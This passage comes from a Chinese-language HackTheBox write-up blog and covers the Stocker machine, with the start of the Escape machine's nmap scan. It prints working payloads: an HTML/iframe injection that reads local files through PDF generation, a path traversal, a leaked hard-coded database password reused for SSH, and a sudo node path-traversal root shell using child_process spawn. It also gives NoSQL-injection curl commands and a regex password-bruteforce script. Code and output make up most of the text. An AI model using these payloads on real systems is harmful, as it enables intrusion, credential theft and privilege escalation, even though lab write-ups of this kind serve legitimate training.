class="line">tss:x:106:112:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:113::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:114::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:116::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:111:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">fwupd-refresh:x:112:119:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mongodb:x:113:65534::&#x2F;home&#x2F;mongodb:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">angoose:x:1001:1001:,,,:&#x2F;home&#x2F;angoose:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>读取文件<code>/etc/nginx/nginx.conf</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;basket&quot;</span>:[&#123;</span><br><span class="line"><span class="attr">&quot;_id&quot;</span>:<span class="string">&quot;638f116eeb060210cbd83a8d&quot;</span>,</span><br><span class="line"><span class="attr">&quot;title&quot;</span>:<span class="string">&quot;&lt;iframe id=&#x27;myFrame&#x27; style=&#x27;width: 1000px; height: 1000px;&#x27; src=&#x27;file:///etc/nginx/nginx.conf&#x27;&gt;&lt;/iframe&gt;&lt;script&gt;var frame = document.getElementById(&#x27;myFrame&#x27;);frame.onload = function () &#123;var body = frame.contentWindow.document.querySelector(&#x27;body&#x27;);body.style.fontSize = &#x27;0.3rem&#x27;;&#125;;&lt;/script&gt;&quot;</span>,</span><br><span class="line"><span class="attr">&quot;description&quot;</span>:<span class="string">&quot;It&#x27;s a red cup.&quot;</span>,</span><br><span class="line"><span class="attr">&quot;image&quot;</span>:<span class="string">&quot;red-cup.jpg../../../../../../etc/passwd&quot;</span>,</span><br><span class="line"><span class="attr">&quot;price&quot;</span>:<span class="number">-1</span>,</span><br><span class="line"><span class="attr">&quot;currentStock&quot;</span>:<span class="number">4</span>,</span><br><span class="line"><span class="attr">&quot;__v&quot;</span>:<span class="number">0</span>,</span><br><span class="line"><span class="attr">&quot;amount&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件<code>/etc/nginx/nginx.conf</code>内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid &#x2F;run&#x2F;nginx.pid;</span><br><span class="line">include &#x2F;etc&#x2F;nginx&#x2F;modules-enabled&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">        worker_connections 768;</span><br><span class="line">        # multi_accept on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Basic Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        sendfile on;</span><br><span class="line">        tcp_nopush on;</span><br><span class="line">        tcp_nodelay on;</span><br><span class="line">        keepalive_timeout 65;</span><br><span class="line">        types_hash_max_size 2048;</span><br><span class="line">        # server_tokens off;</span><br><span class="line"></span><br><span class="line">        # server_names_hash_bucket_size 64;</span><br><span class="line">        # server_name_in_redirect off;</span><br><span class="line"></span><br><span class="line">        include &#x2F;etc&#x2F;nginx&#x2F;mime.types;</span><br><span class="line">        default_type application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # SSL Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Logging Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log;</span><br><span class="line">        error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Gzip Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        gzip on;</span><br><span class="line"></span><br><span class="line">        # gzip_vary on;</span><br><span class="line">        # gzip_proxied any;</span><br><span class="line">        # gzip_comp_level 6;</span><br><span class="line">        # gzip_buffers 16 8k;</span><br><span class="line">        # gzip_http_version 1.1;</span><br><span class="line">        # gzip_types text&#x2F;plain text&#x2F;css application&#x2F;json application&#x2F;javascript text&#x2F;xml application&#x2F;xml application&#x2F;xml+rss text&#x2F;javascript;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Virtual Host Configs</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80;</span><br><span class="line"></span><br><span class="line">            root &#x2F;var&#x2F;www&#x2F;dev;</span><br><span class="line">            index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">            server_name dev.stocker.htb;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                proxy_pass http:&#x2F;&#x2F;127.0.0.1:3000;</span><br><span class="line">                proxy_http_version  1.1;</span><br><span class="line">                proxy_cache_bypass  $http_upgrade;</span><br><span class="line"></span><br><span class="line">                proxy_set_header Upgrade           $http_upgrade;</span><br><span class="line">                proxy_set_header Connection        &quot;upgrade&quot;;</span><br><span class="line">                proxy_set_header Host              $host;</span><br><span class="line">                proxy_set_header X-Real-IP         $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;</span><br><span class="line">                proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">                proxy_set_header X-Forwarded-Host  $host;</span><br><span class="line">                proxy_set_header X-Forwarded-Port  $server_port;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80;</span><br><span class="line"></span><br><span class="line">            root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">            index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">            server_name stocker.htb;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                    try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80 default;</span><br><span class="line"></span><br><span class="line">            server_name _;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                return 301 http:&#x2F;&#x2F;stocker.htb;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得知虚拟主机<code>dev.stocker.htb</code>文件根目录为<code>/var/www/dev</code></p><p>尝试访问<code>/var/www/dev/index.js</code>, <code>/var/www/dev/app.js</code>, <code>/var/www/dev/main.js</code></p><p>服务主文件路径为<code>/var/www/dev/index.js</code><br />内容如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&quot;mongoose&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> MongoStore = <span class="built_in">require</span>(<span class="string">&quot;connect-mongo&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; generatePDF, formatHTML &#125; = <span class="built_in">require</span>(<span class="string">&quot;./pdf.js&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; randomBytes, createHash &#125; = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Configure loading from dotenv for production</span></span><br><span class="line"><span class="keyword">const</span> dbURI = <span class="string">&quot;mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(</span><br><span class="line">  session(&#123;</span><br><span class="line">    secret: randomBytes(<span class="number">32</span>).toString(<span class="string">&quot;hex&quot;</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">true</span>,</span><br><span class="line">    store: MongoStore.create(&#123;</span><br><span class="line">      mongoUrl: dbURI,</span><br><span class="line">    &#125;),</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line">app.use(<span class="string">&quot;/static&quot;</span>, express.static(__dirname + <span class="string">&quot;/assets&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/api/products&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.json([]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> products = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;Product&quot;</span>).find();</span><br><span class="line">  <span class="keyword">return</span> res.json(products);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.session.user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/stock&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.sendFile(__dirname + <span class="string">&quot;/templates/login.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/login&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!username || !password) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=login-error&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> Implement hashing</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> user = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;User&quot;</span>).findOne(&#123; username, password &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=login-error&quot;</span>);</span><br><span class="line"></span><br><span class="line">  req.session.user = user.id;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(req.session);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/stock&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/api/order&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.json(&#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!req.body.basket) <span class="keyword">return</span> res.json(&#123; <span class="attr">success</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> order = <span class="keyword">new</span> mongoose.model(<span class="string">&quot;Order&quot;</span>)(&#123;</span><br><span class="line">    items: req.body.basket.map(<span class="function">(<span class="params">item</span>) =&gt;</span> (&#123; <span class="attr">title</span>: item.title, <span class="attr">price</span>: item.price, <span class="attr">amount</span>: item.amount &#125;)),</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> order.save();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.json(&#123; <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">orderId</span>: order._id &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/api/po/:id&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> order = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;Order&quot;</span>).findById(req.params.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!order) <span class="keyword">return</span> res.sendStatus(<span class="number">404</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> htmlPath = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/pos/<span class="subst">$&#123;req.params.id&#125;</span>.html`</span>;</span><br><span class="line">  <span class="keyword">const</span> filePath = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/pos/<span class="subst">$&#123;req.params.id&#125;</span>.pdf`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.existsSync(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendFile(filePath);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.writeFileSync(htmlPath, formatHTML(order));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> generatePDF(req.params.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.existsSync(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendFile(filePath);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendStatus(<span class="number">500</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/stock&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=auth-required&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.sendFile(__dirname + <span class="string">&quot;/templates/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/logout&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  req.session.user = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> mongoose.connect(dbURI);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setup Mongoose schema</span></span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&quot;./schema.js&quot;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>得到登入密码<code>IHeardPassphrasesArePrettySecure</code></p><p>尝试用于登入angoose账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh angoose@10.10.11.196</span><br><span class="line">IHeardPassphrasesArePrettySecure</span><br></pre></td></tr></table></figure><p>登入成功<br />查看user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/angoose/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c86f19c14d8ee6120dd3c01461b82764</span><br></pre></td></tr></table></figure><h2 id="权限提升-22"><a class="markdownIt-Anchor" href="#权限提升-22"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">IHeardPassphrasesArePrettySecure</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for angoose on stocker:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User angoose may run the following commands on stocker:</span><br><span class="line">    (ALL) &#x2F;usr&#x2F;bin&#x2F;node &#x2F;usr&#x2F;local&#x2F;scripts&#x2F;*.js</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/bash&quot;, [&quot;-p&quot;], &#123;stdio: [0, 1, 2]&#125;)&#x27;</span> &gt; /tmp/BFL.js</span><br><span class="line">sudo /usr/bin/node /usr/<span class="built_in">local</span>/scripts/../../../tmp/BFL.js</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afd487cd1a8b2f2b99d610424c24f39c</span><br></pre></td></tr></table></figure><hr /><blockquote><p>错误思路</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb/login --json <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: &quot;angoose&quot;&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#x27;</span> -v</span><br><span class="line">...</span><br><span class="line">Location: /login?error=login-error</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb/login --json <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;angoose&quot;&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#x27;</span> -v</span><br><span class="line">...</span><br><span class="line">Location: /stock</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://dev.stocker.htb/login&quot;</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line">dic = string.printable</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">exit = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> dic:</span><br><span class="line">json = &#123;<span class="string">&quot;username&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: <span class="string">&quot;angoose&quot;</span>&#125;, <span class="string">&quot;password&quot;</span>: &#123;<span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;^%s&quot;</span> % (password + _)&#125; &#125;</span><br><span class="line">print(json)</span><br><span class="line">res = req.post(url, json = json, allow_redirects = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res.headers[<span class="string">&quot;Location&quot;</span>] == <span class="string">&quot;/stock&quot;</span>:</span><br><span class="line">password = password + _</span><br><span class="line">print(password)</span><br><span class="line">exit = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> exit == <span class="number">1</span>:</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b3e795719e2a644f69838a593dd159ac</span><br></pre></td></tr></table></figure><p>rockyou.txt没跑出来</p><hr /><p>域渗透水平还是一如既往的差</p><h1 id="hackthebox_escape"><a class="markdownIt-Anchor" href="#hackthebox_escape"></a> HackTheBox_Escape</h1><h2 id="信息收集-7"><a class="markdownIt-Anchor" href="#信息收集-7"></a> 信息收集</h2><h3 id="端口扫描-24"><a class="markdownIt-Anchor" href="#端口扫描-24"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-10000 -sV -T5 -v 10.10.11.202</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.202</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 9986 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53&#x2F;tcp   open  domain?</span><br><span class="line">88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-08 22:14:40Z)</span><br><span class="line">135&#x2F;tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds?</span><br><span 